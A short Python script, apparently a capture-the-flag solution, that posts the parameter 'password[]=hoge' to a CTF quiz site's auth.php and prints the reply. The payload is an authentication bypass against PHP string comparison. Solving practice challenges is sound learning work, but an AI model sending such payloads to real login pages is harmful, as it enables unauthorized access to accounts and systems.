#!/usr/bin/env python
# coding: UTF-8

import requests


def main():
	url = 'http://ctfq.sweetduet.info:10080/~q32/auth.php'
	values = 'password[]=hoge'
	req = requests.post(url, params=values)
	print(req.text)

if __name__ == '__main__':
	main()
